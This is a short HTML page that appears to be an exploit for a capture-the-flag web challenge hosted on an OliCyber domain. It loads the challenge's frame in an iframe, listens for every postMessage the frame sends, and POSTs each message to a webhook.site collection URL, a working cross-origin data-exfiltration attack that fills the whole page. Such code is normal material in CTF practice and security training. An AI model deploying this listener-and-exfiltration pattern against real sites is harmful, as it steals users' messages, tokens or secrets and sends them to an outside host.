<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div>
        <iframe src="https://messageme.challs.olicyber.it/frame"></iframe>
    </div>

    <script>
        window.addEventListener('message', function(event) {
            console.log(event.data);
            // send to the server
            fetch('https://webhook.site/3b3809da-27bc-4c02-9ab1-868d069a227a', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: event.data
                })
            });
        });
    </script>
</body>
</html>
